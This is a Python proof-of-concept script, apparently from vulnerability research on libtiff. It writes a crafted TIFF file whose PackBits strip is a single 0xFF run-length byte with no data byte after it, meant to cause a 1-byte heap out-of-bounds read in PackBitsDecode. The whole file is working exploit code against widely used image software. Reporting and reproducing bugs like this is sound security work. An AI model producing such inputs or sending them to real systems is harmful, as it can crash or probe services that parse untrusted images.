#!/usr/bin/env python3
"""
PoC generator for VULN 002: PackBitsDecode run-length branch missing input guard.
Triggers a 1-byte heap OOB read in tif_packbits.c line 249 when cc drops to 0
after reading a run-length header byte but before reading the data byte.
"""
import struct
import os

# Output path
out_dir = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, "vuln_002.tif")

# TIFF layout (little-endian):
#   Offset 0:   TIFF header (8 bytes)
#   Offset 8:   IFD (2 + 9*12 + 4 = 114 bytes)
#   Offset 122: Strip data (1 byte)

STRIP_OFFSET = 122
STRIP_DATA   = b'\xff'   # run-length header n=-1, NO data byte follows

def ifd_entry_short(tag, value):
    """Pack a SHORT IFD entry (type=3, count=1, inline value).
    TIFF entry: tag(2) + type(2) + count(4) + value(4) = 12 bytes.
    For SHORT inline, value occupies the first 2 bytes of the 4-byte field."""
    return struct.pack('<HHII', tag, 3, 1, value & 0xffff)

def ifd_entry_long(tag, value):
    """Pack a LONG IFD entry (type=4, count=1, inline value).
    TIFF entry: tag(2) + type(2) + count(4) + value(4) = 12 bytes."""
    return struct.pack('<HHII', tag, 4, 1, value)

# TIFF header: little-endian magic, version 42, IFD at offset 8
header = struct.pack('<HHI', 0x4949, 42, 8)

# 9 IFD entries sorted by tag number
n_entries = 9
entries = b''
entries += ifd_entry_short(0x0100, 4)       # ImageWidth = 4
entries += ifd_entry_short(0x0101, 1)       # ImageLength = 1
entries += ifd_entry_short(0x0102, 8)       # BitsPerSample = 8
entries += ifd_entry_short(0x0103, 32773)   # Compression = PackBits (0x8005)
entries += ifd_entry_short(0x0106, 1)       # PhotometricInterpretation = BlackIsZero
entries += ifd_entry_long (0x0111, STRIP_OFFSET)  # StripOffsets
entries += ifd_entry_short(0x0115, 1)       # SamplesPerPixel = 1
entries += ifd_entry_short(0x0116, 1)       # RowsPerStrip = 1
entries += ifd_entry_long (0x0117, 1)       # StripByteCounts = 1

assert len(entries) == n_entries * 12, f"Expected {n_entries*12} bytes, got {len(entries)}"

ifd  = struct.pack('<H', n_entries)  # entry count
ifd += entries
ifd += struct.pack('<I', 0)          # next IFD = 0 (none)

# Assemble file
tif_bytes = header + ifd + STRIP_DATA
assert len(tif_bytes) == STRIP_OFFSET + 1, f"Layout mismatch: {len(tif_bytes)}"

with open(out_path, 'wb') as f:
    f.write(tif_bytes)

print(f"Written {len(tif_bytes)} bytes to {out_path}")
print("Strip data: 1 byte = 0xFF (run-length header n=-1, no data byte)")
print("Expected: ASAN heap-buffer-overflow READ 1 in PackBitsDecode (tif_packbits.c:249)")
